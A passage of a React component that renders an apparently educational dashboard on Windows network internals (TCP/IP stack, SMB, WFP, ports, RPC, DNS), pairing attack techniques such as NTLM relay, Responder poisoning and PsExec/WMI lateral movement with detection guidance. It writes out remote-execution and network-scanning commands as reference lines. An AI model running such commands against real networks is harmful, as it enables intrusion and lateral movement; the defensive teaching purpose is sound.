import { useState } from "react";

const C = {
  bg: "#06080d",
  panel: "#080b14",
  header: "#0b0e1c",
  border: "#162038",
  cyan: "#00b8e8",
  green: "#00d870",
  red: "#ff1e40",
  orange: "#ff8400",
  yellow: "#e8b818",
  purple: "#8040e8",
  teal: "#00c0a0",
  pink: "#e82890",
  lime: "#78c820",
  sky: "#28a8f0",
  gold: "#c88010",
  blue: "#2860e8",
  navy: "#2040a0",
  text: "#a0b4c8",
  dim: "#3c5468",
  bright: "#c8dced",
};

const mono = "'JetBrains Mono','Cascadia Code','Fira Code',monospace";

const S = {
  root: { background: C.bg, color: C.text, fontFamily: mono, minHeight: "100vh", fontSize: "12.5px", lineHeight: "1.65" },
  bar: { background: C.header, borderBottom: `1px solid ${C.border}`, padding: "7px 20px", display: "flex", alignItems: "center", gap: "14px", position: "sticky", top: 0, zIndex: 100 },
  dot: c => ({ width: 9, height: 9, borderRadius: "50%", background: c, display: "inline-block" }),
  wrap: { maxWidth: "1220px", margin: "0 auto", padding: "18px 14px", display: "flex", flexDirection: "column", gap: "14px" },
  panel: c => ({ background: C.panel, border: `1px solid ${c || C.border}`, borderRadius: "5px", overflow: "hidden" }),
  ph: c => ({ background: C.header, borderBottom: `1px solid ${c || C.border}`, padding: "9px 15px", display: "flex", alignItems: "center", gap: "9px" }),
  pt: c => ({ color: c || C.cyan, fontWeight: "700", fontSize: "11px", letterSpacing: "1.8px", textTransform: "uppercase" }),
  pb: { padding: "15px" },
  code: { background: "#030508", border: `1px solid ${C.border}`, borderRadius: "4px", padding: "11px 13px", fontFamily: mono, fontSize: "11.5px", overflowX: "auto", whiteSpace: "pre", lineHeight: "1.75" },
  grid2: { display: "grid", gridTemplateColumns: "1fr 1fr", gap: "14px" },
  grid3: { display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "11px" },
  grid4: { display: "grid", gridTemplateColumns: "1fr 1fr 1fr 1fr", gap: "10px" },
  badge: c => ({ background: `${c}1a`, border: `1px solid ${c}55`, color: c, borderRadius: "3px", padding: "2px 7px", fontSize: "10.5px", fontWeight: "700" }),
  tag: c => ({ display: "inline-block", background: `${c}14`, border: `1px solid ${c}40`, color: c, borderRadius: "3px", padding: "1px 6px", fontSize: "10.5px", margin: "2px" }),
  sep: { borderColor: C.border, margin: "11px 0", borderStyle: "dashed", borderWidth: "0 0 1px 0" },
  row: { display: "flex", gap: "9px", marginBottom: "7px", alignItems: "flex-start" },
  bul: c => ({ color: c || C.cyan, minWidth: "13px", fontWeight: "700", marginTop: "1px" }),
  tab: (a, c) => ({ padding: "6px 13px", cursor: "pointer", fontFamily: mono, background: a ? `${c}1a` : "transparent", border: `1px solid ${a ? c : C.border}`, borderRadius: "4px", color: a ? c : C.dim, fontSize: "10.5px", fontWeight: a ? "700" : "400", letterSpacing: "0.5px", transition: "all 0.15s" }),
};

const PB = ({ title, icon, color, accent, children }) => (
  <div style={S.panel(accent || color || C.border)}>
    <div style={S.ph(accent || color || C.border)}>
      <span>{icon}</span><span style={S.pt(color || C.cyan)}>{title}</span>
    </div>
    <div style={S.pb}>{children}</div>
  </div>
);
const Pill = ({ c, children }) => <span style={S.badge(c || C.cyan)}>{children}</span>;
const Tag  = ({ c, children }) => <span style={S.tag(c || C.cyan)}>{children}</span>;
const Row  = ({ c, b, children }) => (
  <div style={S.row}><span style={S.bul(c)}>{b || "▸"}</span><span style={{ color: C.text }}>{children}</span></div>
);
const KV = ({ k, v, kc }) => (
  <div style={{ display: "flex", gap: "8px", marginBottom: "5px" }}>
    <span style={{ color: kc || C.teal, minWidth: "190px", fontWeight: "600" }}>{k}</span>
    <span style={{ color: C.dim }}>:</span><span style={{ color: C.bright }}>{v}</span>
  </div>
);

/* ── Windows TCP/IP Stack SVG ───────────────────────────────────────────── */
const TCPIPStack = () => (
  <svg viewBox="0 0 760 520" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#3c5468" fontSize="10" letterSpacing="2">WINDOWS TCP/IP NETWORK STACK — USER MODE ↔ KERNEL MODE ↔ HARDWARE</text>

    {/* User Mode */}
    <rect x="10" y="22" width="740" height="152" rx="4" fill="#07090e" stroke="#00d87022" strokeWidth="1" />
    <text x="20" y="40" fill="#00d870" fontSize="10" fontWeight="700" letterSpacing="2">USER MODE</text>

    {[
      { label: "Application\n(Chrome, curl, SMB client)", color: C.cyan, x: 20, w: 160, desc: "Calls Winsock API\nWSASend / WSARecv" },
      { label: "Winsock 2 API\n(ws2_32.dll)", color: C.green, x: 195, w: 150, desc: "Socket abstraction\nName resolution" },
      { label: "Name Resolution\n(dnsapi.dll)", color: C.teal, x: 360, w: 150, desc: "DNS / mDNS / NetBIOS\nNS cache + stub resolver" },
      { label: "RPC Runtime\n(rpcrt4.dll)", color: C.purple, x: 525, w: 150, desc: "COM / DCOM transport\nEndpoint mapping :135" },
    ].map(({ label, color, x, w, desc }) => (
      <g key={label}>
        <rect x={x} y={48} width={w} height={70} rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <text x={x + w/2} y={66} textAnchor="middle" fill={color} fontSize="10" fontWeight="700">{label.split("\n")[0]}</text>
        <text x={x + w/2} y={80} textAnchor="middle" fill={color} fontSize="9">{label.split("\n")[1]}</text>
        {desc.split("\n").map((l, i) => <text key={l} x={x + w/2} y={97 + i * 13} textAnchor="middle" fill="#3c5468" fontSize="8.5">{l}</text>)}
      </g>
    ))}

    {/* AFD.sys bridge */}
    <rect x="10" y="132" width="740" height="36" rx="3" fill="#0a1018" stroke="#00b8e844" strokeWidth="1.5" />
    <text x="380" y="148" textAnchor="middle" fill="#00b8e8" fontSize="10" fontWeight="700">AFD.SYS — Ancillary Function Driver (Winsock Kernel Interface)</text>
    <text x="380" y="162" textAnchor="middle" fill="#3c5468" fontSize="8.5">Bridges Winsock user-mode calls to TDI/WSK kernel interfaces · socket object management · async I/O completion ports</text>

    {/* Kernel mode boundary */}
    <line x1="10" y1="170" x2="750" y2="170" stroke="#ffffff0e" strokeWidth="1" strokeDasharray="6,4" />
    <text x="380" y="169" textAnchor="middle" fill="#ffffff18" fontSize="9">─── KERNEL / USER BOUNDARY ───</text>

    {/* Kernel Mode */}
    <rect x="10" y="174" width="740" height="300" rx="4" fill="#06070c" stroke="#8040e822" strokeWidth="1" />
    <text x="20" y="192" fill="#8040e8" fontSize="10" fontWeight="700" letterSpacing="2">KERNEL MODE</text>

    {/* WFP callout */}
    <rect x="620" y="200" width="126" height="80" rx="3" fill="#e828900c" stroke="#e8289044" strokeWidth="1.5" />
    <text x="683" y="218" textAnchor="middle" fill="#e82890" fontSize="10" fontWeight="700">WFP</text>
    <text x="683" y="232" textAnchor="middle" fill="#3c5468" fontSize="8.5">Windows Filtering</text>
    <text x="683" y="246" textAnchor="middle" fill="#3c5468" fontSize="8.5">Platform (Firewall)</text>
    <text x="683" y="260" textAnchor="middle" fill="#3c5468" fontSize="8.5">Callout drivers hook</text>
    <text x="683" y="274" textAnchor="middle" fill="#3c5468" fontSize="8.5">into TCP/IP at layers</text>

    {/* TCP/IP stack layers */}
    {[
      { label: "tcpip.sys — TCP/UDP/IP/ICMP Protocol Drivers", color: C.yellow, y: 198, desc: "TCP connection management · UDP datagrams · IP routing · ICMP · raw sockets · IPsec · Teredo/6to4" },
      { label: "HTTP.sys — Kernel HTTP Driver", color: C.sky, y: 252, desc: "Kernel-mode HTTP listener (IIS, WinRM, WCF). Direct port 80/443 without user-mode socket overhead. URL ACL via netsh." },
      { label: "SMB (srv2.sys / mrxsmb.sys)", color: C.orange, y: 306, desc: "srv2.sys = SMB server kernel driver. mrxsmb.sys = SMB client mini-redirector. SMB over TCP port 445 only (since Win2000)." },
    ].map(({ label, color, y, desc }) => (
      <g key={label}>
        <rect x="10" y={y} width="600" height="48" rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <rect x="10" y={y} width="4" height="48" fill={color} rx="1" />
        <text x="22" y={y + 18} fill={color} fontSize="10.5" fontWeight="700">{label}</text>
        <text x="22" y={y + 35} fill="#3c5468" fontSize="9">{desc}</text>
      </g>
    ))}

    {/* NDIS */}
    <rect x="10" y="362" width="740" height="44" rx="3" fill="#c8801010" stroke="#c8801055" strokeWidth="1.5" />
    <text x="380" y="381" textAnchor="middle" fill="#c88010" fontSize="11" fontWeight="700">NDIS (Network Driver Interface Specification) — ndis.sys</text>
    <text x="380" y="397" textAnchor="middle" fill="#3c5468" fontSize="9">Protocol-to-miniport binding layer · NDIS 6.x (Vista+): parallel I/O, send/recv paths · Virtual switch (Hyper-V) · RSS / VMQ offload</text>

    {/* Miniport drivers */}
    {[
      ["NIC Miniport\n(e1000.sys / i219.sys)", C.green, 20],
      ["Virtual NIC\n(vmswitch.sys)", C.teal, 215],
      ["VPN / TAP\n(WireGuard.sys)", C.purple, 410],
      ["Wi-Fi\n(NetwNs64.sys)", C.sky, 600],
    ].map(([label, color, x]) => (
      <g key={label}>
        <rect x={x} y={416} width="165" height="48" rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <text x={x + 82} y={436} textAnchor="middle" fill={color} fontSize="9.5" fontWeight="700">{label.split("\n")[0]}</text>
        <text x={x + 82} y={450} textAnchor="middle" fill="#3c5468" fontSize="8.5">{label.split("\n")[1]}</text>
      </g>
    ))}

    {/* Hardware */}
    <rect x="10" y="474" width="740" height="36" rx="3" fill="#0a0c10" stroke="#3c546855" strokeWidth="1" />
    <text x="380" y="492" textAnchor="middle" fill="#3c5468" fontSize="10" fontWeight="700">HARDWARE — Physical NIC / Wi-Fi Adapter / Virtual NIC (Hyper-V vSwitch)</text>
    <text x="380" y="505" textAnchor="middle" fill="#3c5468" fontSize="8.5">DMA transfers · Interrupt handling · Hardware offload: checksum, LSO, RSS, VMQ</text>
  </svg>
);

/* ── SMB Protocol Diagram ───────────────────────────────────────────────── */
const SMBDiagram = () => (
  <svg viewBox="0 0 760 380" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#3c5468" fontSize="10" letterSpacing="2">SMB PROTOCOL — VERSIONS · NEGOTIATION · SECURITY MODEL</text>

    {/* Version comparison */}
    {[
      { ver: "SMB 1.0", color: C.red, x: 10, features: ["DOS-era (1980s)", "No encryption", "NTLM only", "EternalBlue target", "DISABLE IMMEDIATELY", "ms17-010 exploit"], note: "⚠ DISABLE: Remove-WindowsFeature FS-SMB1" },
      { ver: "SMB 2.x", color: C.orange, x: 190, features: ["Vista/2008 (2006)", "Better perf (pipelining)", "Request compounding", "Larger MTU support", "Signing optional", "No encryption"], note: "⚠ Enable signing: Set-SmbServerConfiguration -RequireSecuritySignature $true" },
      { ver: "SMB 3.0", color: C.yellow, x: 370, features: ["Win8/2012 (2012)", "AES-128-CCM encrypt", "Multichannel (multi-NIC)", "RDMA (SMB Direct)", "Scale-out FS", "Pre-auth integrity"], note: "✓ Enable encrypt: Set-SmbServerConfiguration -EncryptData $true" },
      { ver: "SMB 3.1.1", color: C.green, x: 550, features: ["Win10/2016 (2015)", "Pre-auth integrity SHA512", "AES-128-GCM encrypt", "Negotiate signing req", "Cluster dialect fence", "Strongest security"], note: "✓ Current recommended. GCM faster than CCM." },
    ].map(({ ver, color, x, features, note }) => (
      <g key={ver}>
        <rect x={x} y={22} width="168" height="240" rx="4" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <text x={x + 84} y={42} textAnchor="middle" fill={color} fontSize="11" fontWeight="800">{ver}</text>
        {features.map((f, i) => (
          <text key={f} x={x + 84} y={60 + i * 22} textAnchor="middle" fill={i === 0 ? color : "#5a7080"} fontSize="9.5">{f}</text>
        ))}
        <text x={x + 84} y={235} textAnchor="middle" fill={color} fontSize="8" fontWeight="700">{note.slice(0, 40)}</text>
        <text x={x + 84} y={248} textAnchor="middle" fill={color} fontSize="8">{note.slice(40)}</text>
      </g>
    ))}

    {/* SMB session establishment */}
    <text x="380" y="278" textAnchor="middle" fill="#3c5468" fontSize="9" letterSpacing="1">SMB SESSION ESTABLISHMENT FLOW</text>
    {[
      { msg: "TCP SYN/SYN-ACK/ACK (port 445)", color: C.dim },
      { msg: "NEGOTIATE_PROTOCOL_REQUEST → SMB dialects supported list", color: C.cyan },
      { msg: "NEGOTIATE_PROTOCOL_RESPONSE → selected dialect + server capabilities + security blob (SPNEGO)", color: C.teal },
      { msg: "SESSION_SETUP_REQUEST → NTLM/Kerberos auth token", color: C.purple },
      { msg: "SESSION_SETUP_RESPONSE → auth complete → session key derived → signing/encryption enabled", color: C.green },
      { msg: "TREE_CONNECT → \\\\server\\share access", color: C.orange },
    ].map(({ msg, color }, i) => (
      <g key={msg}>
        <rect x="20" y={288 + i * 14} width="720" height="12" rx="2" fill={`${color}0a`} />
        <text x="28" y={299 + i * 14} fill={color} fontSize="8.5">{`${i + 1}. ${msg}`}</text>
      </g>
    ))}

    <text x="380" y="376" textAnchor="middle" fill="#ff1e4066" fontSize="9" fontWeight="700">⚠ SMB ATTACKS: EternalBlue (SMB1), NTLM Relay over SMB (no signing), Responder LLMNR/NBT-NS → SMB capture</text>
  </svg>
);

/* ── WFP Architecture ───────────────────────────────────────────────────── */
const WFPDiagram = () => (
  <svg viewBox="0 0 760 360" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#3c5468" fontSize="10" letterSpacing="2">WINDOWS FILTERING PLATFORM (WFP) — KERNEL FIREWALL ARCHITECTURE</text>

    {/* User mode */}
    <rect x="10" y="22" width="740" height="84" rx="4" fill="#07090e" stroke="#00d87022" strokeWidth="1" />
    <text x="20" y="40" fill="#00d870" fontSize="10" fontWeight="700">USER MODE MANAGEMENT LAYER</text>
    {[
      ["Windows Firewall\n(msfwc.dll / wf.msc)", C.cyan, 20],
      ["Base Filtering Engine\n(BFE service — bfe.dll)", C.yellow, 230],
      ["IKE/AuthIP\n(ikeext.dll — IPsec)", C.teal, 440],
      ["Third-party AV/EDR\nWFP callout API", C.purple, 610],
    ].map(([label, color, x]) => (
      <g key={label}>
        <rect x={x} y={48} width="174" height="48" rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <text x={x + 87} y={66} textAnchor="middle" fill={color} fontSize="9.5" fontWeight="700">{label.split("\n")[0]}</text>
        <text x={x + 87} y={80} textAnchor="middle" fill="#3c5468" fontSize="8.5">{label.split("\n")[1]}</text>
      </g>
    ))}

    {/* Kernel mode */}
    <rect x="10" y="114" width="740" height="230" rx="4" fill="#06070c" stroke="#8040e822" strokeWidth="1" />
    <text x="20" y="132" fill="#8040e8" fontSize="10" fontWeight="700">KERNEL MODE — WFP ENGINE (tcpip.sys integration)</text>

    {/* Filter layers */}
    {[
      { label: "INBOUND TRANSPORT (IP receive path)", color: C.sky, y: 140, desc: "Filters: source IP/port, protocol, direction=IN. Applied before TCP stack processes packet." },
      { label: "OUTBOUND TRANSPORT (IP send path)", color: C.green, y: 184, desc: "Filters: dest IP/port, application. Applied after TCP stack sends packet. App-layer firewall rules." },
      { label: "ALE (Application Layer Enforcement)", color: C.orange, y: 228, desc: "Stateful connection filtering. Tracks TCP flow. App identity (process PID). Block/permit per app." },
      { label: "STREAM LAYER (TCP data stream)", color: C.purple, y: 272, desc: "Inspect TCP stream bytes. DPI capability. Used by IDS/IPS callout drivers (Network Inspection System)." },
    ].map(({ label, color, y, desc }) => (
      <g key={label}>
        <rect x="20" y={y} width="720" height="38" rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <rect x="20" y={y} width="4" height="38" fill={color} rx="1" />
        <text x="32" y={y + 16} fill={color} fontSize="10" fontWeight="700">{label}</text>
        <text x="32" y={y + 30} fill="#3c5468" fontSize="8.5">{desc}</text>
      </g>
    ))}

    {/* Filter action */}
    <rect x="20" y="318" width="720" height="22" rx="3" fill="#0a1018" stroke="#3c546855" strokeWidth="1" />
    <text x="380" y="333" textAnchor="middle" fill="#3c5468" fontSize="8.5">Filter actions per layer: PERMIT | BLOCK | CALLOUT (invoke callout driver for inspection) · Priority: weight-based (higher weight = evaluated first)</text>

    {/* netsh command */}
    <text x="380" y="360" textAnchor="middle" fill="#3c5468" fontSize="8.5">Management: netsh advfirewall · New-NetFirewallRule · wf.msc · Get-NetFirewallRule (PowerShell) · WFP API (FwpmFilterAdd0)</text>
  </svg>
);

/* ── Protocol Port Map ──────────────────────────────────────────────────── */
const PortMap = () => {
  const ports = [
    ["53",   "UDP/TCP", "DNS",       "DNS client queries → DNS server. Zone transfers: TCP. DNS poisoning target.", C.teal],
    ["88",   "TCP/UDP", "Kerberos",  "Authentication. KDC on all DCs. Must be open from all domain members to DCs.", C.yellow],
    ["135",  "TCP",     "MSRPC EPM", "RPC Endpoint Mapper. All DCOM/WMI/RPC traffic starts here. Very common lateral movement port.", C.orange],
    ["137",  "UDP",     "NetBIOS NS","NetBIOS Name Service. Legacy name resolution. LLMNR/NBT-NS poisoning via Responder.", C.red],
    ["139",  "TCP",     "NetBIOS SS","NetBIOS Session Service. SMB over NetBIOS (legacy). Use only port 445 modern SMB.", C.red],
    ["389",  "TCP",     "LDAP",      "AD LDAP queries. Unsigned by default (use LDAPS 636). BloodHound uses this port.", C.cyan],
    ["443",  "TCP",     "HTTPS",     "WinRM over HTTPS (5986 also), ADFS, web services. Most allowed through firewalls.", C.green],
    ["445",  "TCP",     "SMB",       "Server Message Block — file/printer sharing, SYSVOL, lateral movement. Block outbound at perimeter.", C.red],
    ["464",  "TCP/UDP", "kpasswd",   "Kerberos password change. Required for domain password changes.", C.dim],
    ["636",  "TCP",     "LDAPS",     "LDAP over TLS. Always use over 389 in production. Certificate required on DC.", C.green],
    ["3268", "TCP",     "GC LDAP",   "Global Catalog LDAP. Forest-wide searches. BloodHound uses this too.", C.cyan],
    ["3389", "TCP",     "RDP",       "Remote Desktop Protocol. High-value attack port — credential theft, BlueKeep, lateral movement.", C.red],
    ["5985", "TCP",     "WinRM HTTP","PowerShell Remoting, Enter-PSSession. HTTP (negotiate auth). Requires WinRM enabled.", C.purple],
    ["5986", "TCP",     "WinRM HTTPS","WinRM over TLS. Recommended over 5985. Certificate auth possible.", C.teal],
    ["49152+","TCP",    "RPC Dynamic","DCOM/RPC dynamic ports. Old range: 1025-65535. New: 49152-65535. Hard to firewall.", C.orange],
  ];
  return (
    <div>
      <div style={{ display: "grid", gridTemplateColumns: "55px 70px 90px 1fr 70px", gap: "1px", background: C.border, borderRadius: "4px", overflow: "hidden" }}>
        {["PORT","PROTO","SERVICE","DESCRIPTION + ATTACK SURFACE","RISK"].map(h => (
          <div key={h} style={{ background: C.header, padding: "6px 8px" }}>
            <span style={{ color: C.dim, fontWeight: "700", fontSize: "10px" }}>{h}</span>
          </div>
        ))}
        {ports.map(([port, proto, svc, desc, c], i) => (
          [port, proto, svc, desc, ["CRIT","CRIT","HIGH","MED","MED","MED","LOW","CRIT","LOW","LOW","MED","CRIT","HIGH","MED","HIGH"][i]].map((cell, j) => (
            <div key={`${port}${j}`} style={{ background: i % 2 === 0 ? "#07080d" : C.panel, padding: "6px 8px", borderTop: `1px solid ${C.border}` }}>
              <span style={{ color: [c, C.dim, C.sky, C.text, [C.red,C.red,C.orange,C.yellow,C.yellow,C.yellow,C.dim,C.red,C.dim,C.dim,C.yellow,C.red,C.orange,C.yellow,C.orange][i]][j], fontSize: "11px", fontWeight: j === 0 ? "700" : "400" }}>{cell}</span>
            </div>
          ))
        ))}
      </div>
    </div>
  );
};

/* ── RPC Internals ──────────────────────────────────────────────────────── */
const RPCInternals = () => (
  <div>
    <div style={S.grid2}>
      <div>
        <div style={{ color: C.orange, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ RPC ARCHITECTURE & FLOW</div>
        <div style={S.code}>
{`RPC (Remote Procedure Call) — DCE/MS-RPC`}
{``}
{`Client stub → rpcrt4.dll (marshalling)`}
{`  ↓ selects transport:`}
{`  ncacn_ip_tcp (TCP/IP)`}
{`  ncacn_np    (named pipe \\pipe\\*)`}
{`  ncalrpc     (local ALPC — same machine)`}
{``}
{`Endpoint Mapper (EPM) on port 135:`}
{`  Client: RpcEpResolveBinding()`}
{`  → asks EPM: "where is interface UUID X?"`}
{`  → EPM returns: port/pipe for that interface`}
{`  Client connects directly to resolved endpoint`}
{``}
{`Common RPC interfaces (UUIDs):`}
{`  {6BFFD098-A112-3610-9833-46C3F87E345A}`}
{`     Workstation service (wkssvc)`}
{`  {4B324FC8-1670-01D3-1278-5A47BF6EE188}`}
{`     Server service (srvsvc) — share enum`}
{`  {12345778-1234-ABCD-EF00-0123456789AB}`}
{`     LSA — credential operations on DC`}
{`  {E1AF8308-5D1F-11C9-91A4-08002B14A0FA}`}
{`     MS-EVEN — event log RPC`}
{``}
{`# Enumerate active RPC endpoints:`}
{`PS> Get-RpcEndpoint  ; (RSAT / impacket-rpcdump)`}
{`C:\\> rpcinfo -p <host>`}
        </div>
      </div>
      <div>
        <div style={{ color: C.purple, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ DCOM / WMI OVER RPC</div>
        <div style={S.code}>
{`DCOM = Distributed COM over RPC:`}
{`  IOXIDResolver on port 135`}
{`  → IRemoteActivation to activate COM class`}
{`  → Dynamic port allocated for subsequent calls`}
{``}
{`WMI (Windows Management Instrumentation):`}
{`  winmgmt service → WMI repository (OBJECTS.DATA)`}
{`  DCOM-based: port 135 + dynamic`}
{`  WBEM over DCOM: namespace root\\cimv2`}
{``}
{`WMI lateral movement (cmd exec):`}
{`  wmic /node:target process call create "cmd.exe"`}
{`  Invoke-WmiMethod -Class Win32_Process -Name Create`}
{``}
{`WMI subscriptions (persistence):`}
{`  ActiveScriptEventConsumer → VBScript on event`}
{`  CommandLineEventConsumer → cmd on trigger`}
{`  Event filter: __InstanceCreationEvent (process)`}
{`  → fileless, registry-less persistence`}
{``}
{`Detection:`}
{`  Sysmon Event 19/20/21 (WMI subscription events)`}
{`  Event 4648 — explicit credential WMI auth`}
{`  wmiprvse.exe spawning cmd/powershell (Event 1)`}
        </div>
        <div style={{ marginTop: "10px", background: "#120808", border: `1px solid ${C.red}33`, borderRadius: "4px", padding: "9px" }}>
          <div style={{ color: C.red, fontSize: "11px", fontWeight: "700", marginBottom: "4px" }}>⚠ RPC ATTACK VECTORS</div>
          <Row c={C.red}>Port 135 exposed → DCOM lateral movement without SMB. Harder to filter than 445.</Row>
          <Row c={C.orange}>Named pipe RPC (ncacn_np) rides over SMB port 445 — cannot block 445 and keep RPC working.</Row>
          <Row c={C.yellow}>PrintSpoofer abuses MS-RPRN (Print System Remote Protocol) RPC to coerce SYSTEM token.</Row>
        </div>
      </div>
    </div>
  </div>
);

/* ── DNS Internals ──────────────────────────────────────────────────────── */
const DNSInternals = () => (
  <div>
    <div style={S.grid2}>
      <div>
        <div style={{ color: C.teal, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ WINDOWS DNS RESOLUTION ORDER</div>
        <div style={S.code}>
{`Resolution order (configurable):`}
{`1. Hosts file: C:\\Windows\\System32\\drivers\\etc\\hosts`}
{`   (checked first — attacker persistence vector)`}
{``}
{`2. DNS Resolver Cache (dnsapi.dll)`}
{`   ipconfig /displaydns  — view cache`}
{`   ipconfig /flushdns   — clear cache`}
{``}
{`3. DNS Server query (via dnscache service)`}
{`   Stub resolver → configured DNS server (DC)`}
{`   DNSSEC validation (if configured)`}
{``}
{`4. LLMNR (Link-Local Multicast Name Resolution)`}
{`   UDP 5355 — broadcasts on local subnet`}
{`   No authentication — Responder poisoning target`}
{``}
{`5. NetBIOS Name Service (WINS / broadcast)`}
{`   UDP 137 — broadcasts on local subnet`}
{`   Very legacy — disable in hardened envs`}
{``}
{`AD-integrated DNS:`}
{`  DNS zones stored in AD (DomainDNSZones)`}
{`  Replicated via AD replication (not zone transfer)`}
{`  Dynamic DNS: clients auto-register A/PTR records`}
{`  SRV records: _ldap._tcp.dc._msdcs.corp.local`}
        </div>
      </div>
      <div>
        <div style={{ color: C.red, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ DNS ATTACK TECHNIQUES</div>
        {[
          ["LLMNR / NBT-NS Poisoning", "Responder.py answers LLMNR queries for non-existent hosts. Victim sends NTLM auth → Responder captures hash. No network privileges needed — just be on the same subnet.", C.red],
          ["DNS Spoofing / Cache Poisoning", "Inject forged DNS responses before legitimate server. Kaminsky attack: predictable query IDs. DNSSEC prevents this. Internal DNS: if attacker has write access to AD DNS zone → poison any record.", C.orange],
          ["DNS Tunneling (C2 exfiltration)", "Encode C2 traffic in DNS TXT/CNAME queries (iodine, dnscat2). Bypasses most proxy/firewall controls since DNS is allowed everywhere. Detect via anomalous query volume/subdomain length.", C.yellow],
          ["ADIDNS Abuse (LDAP DNS records)", "Any authenticated user can add DNS records to AD-integrated zones (MachineAccountQuota applies to DNS too). Create wildcard DNS entry → capture NTLM from any misconfigured client hitting that name.", C.orange],
        ].map(([t, d, c]) => (
          <div key={t} style={{ background: "#0e0808", border: `1px solid ${c}33`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
            <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>⚠ {t}</div>
            <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
          </div>
        ))}
      </div>
    </div>
  </div>
);

/* ── Network Attack Matrix ──────────────────────────────────────────────── */
const NetAttackPanel = ({ tab }) => {
  const attacks = {
    smb: [
      { name: "SMB NTLM Relay (no signing)", color: C.red,
        prereq: "Network position (same subnet or router access)",
        how: "Capture NTLM authentication (from LLMNR poisoning, phishing, print-spooler coercion) and relay it in real time to another target. impacket-ntlmrelayx relays credential to DC LDAP, SMB shares, or EWS. Can create computer accounts, dump LDAP, write ACLs — all in real time. SMB signing and LDAP signing/sealing block this entirely.",
        detect: "Monitor for Responder tool signatures on network (LLMNR responses from non-DNS servers). Event 4624 from unexpected source IPs. NetNTLM auth to DC from workstation IP (not DC IP).", ioc: "LLMNR responses from non-DNS/DC IPs. SMB auth from workstation to workstation (not server) using privileged account. ntlmrelayx network signatures." },
      { name: "PrintNightmare / Print Spooler Coercion", color: C.orange,
        prereq: "Any authenticated domain user account",
        how: "MS-RPRN RPC interface (Print Spooler) allows any user to force DC to authenticate to arbitrary host via RpcRemoteFindFirstPrinterChangeNotification. DC sends NTLM auth → relay to DC LDAP (no SMB signing on LDAP by default) → create computer account + DCSync rights. CVE-2021-1675, CVE-2021-34527.",
        detect: "Event 4624 Type 3 from DC to non-DC machine (reverse auth direction). RPC traffic from DC to workstation on dynamic port. Disable Print Spooler on all DCs (Set-Service Spooler -StartupType Disabled).", ioc: "DC computer account authenticating TO a non-DC machine. MS-RPRN RPC call from non-print-server. spoolsv.exe network connection (Sysmon Event 3) from DC." },
    ],
    recon: [
      { name: "Network Reconnaissance (Nmap / BloodHound / CrackMapExec)", color: C.yellow,
        prereq: "Network connectivity to targets",
        how: "Systematic port scanning (nmap -sV -sC --script smb-enum*), SMB enumeration (crackmapexec smb 10.0.0.0/16), BloodHound collection, LDAP enumeration (ldapsearch). Maps all hosts, open ports, service versions, SMB signing status, domain users/groups — all from one compromised foothold.",
        detect: "Sysmon Event 3: high volume of outbound connections to new destinations. IDS rules for nmap fingerprinting (TCP window size anomalies, ICMP probes). Event 4625 spikes (auth attempts during enum). NetFlow: single host connecting to 50+ destinations in 60 seconds.", ioc: "Single source IP connecting to 20+ hosts within 1 minute (port scan). Event 4776 spikes (NTLM validation attempts). SMB sessions established then immediately torn down (share enum pattern)." },
      { name: "LLMNR / NBT-NS Poisoning (Responder)", color: C.red,
        prereq: "Layer 2 network access (same subnet as victims)",
        how: "Responder.py listens for LLMNR (UDP 5355) and NBT-NS (UDP 137) multicast queries. When victim queries non-existent hostname (typo, mis-configured client), Responder responds with attacker's IP → victim sends NTLM auth → hash captured. Can also poison mDNS, WPAD, DHCP. Offline crack or relay the captured hash.",
        detect: "IDS rules for LLMNR responses from non-authorized hosts. Network sweep: only DNS servers/DCs should answer LLMNR. NetFlow: unexpected LLMNR responses. Sysmon Event 3 for unusual SMB to new IP. Alert on Event 4776 NTLM validation from IPs that are not domain controllers.", ioc: "LLMNR/NBT-NS response from non-DC/DNS host. Burst of NTLMv2 hashes arriving from multiple victims over short window. Responder ASCII banner in network capture." },
    ],
    lateral: [
      { name: "PsExec-style Lateral Movement (SMB + SCM)", color: C.red,
        prereq: "Admin rights on target (hash or creds)",
        how: "Upload service binary to ADMIN$ share → create service via SCM RPC (SVCCTL) → start service → get shell. impacket-psexec, CrackMapExec, Metasploit psexec. Leaves: new service (Event 7045), binary in ADMIN$ (C:\\Windows directory).",
        detect: "Event 7045: new service with random name + path in C:\\Windows or ADMIN$. Sysmon Event 1: cmd.exe / powershell.exe spawned from services.exe with unusual parent. Event 4697: service installed from Security log.", ioc: "Event 7045 with service name = random chars. Binary path in %SystemRoot% owned by non-admin. Service created and deleted within seconds (cleanup pattern)." },
      { name: "WinRM Lateral Movement", color: C.purple,
        prereq: "WinRM enabled on target + credentials",
        how: "Enter-PSSession / Invoke-Command over WinRM (port 5985/5986). Legitimate admin tool abused for lateral movement. No new service created. WinRM session leaves Event 4624 Type 3 on target (or Type 10 for interactive). Difficult to distinguish from legitimate admin traffic without baseline.",
        detect: "Event 4624 Type 3 on target from unexpected source. Sysmon Event 3: outbound WinRM (port 5985) from workstation (not server). wsmprovhost.exe spawning PowerShell (Sysmon Event 1). PowerShell script block logging shows remote commands.", ioc: "wsmprovhost.exe spawning cmd.exe or unusual PowerShell on target. WinRM connections from workstation-class source to server. 5985 outbound from non-admin workstation." },
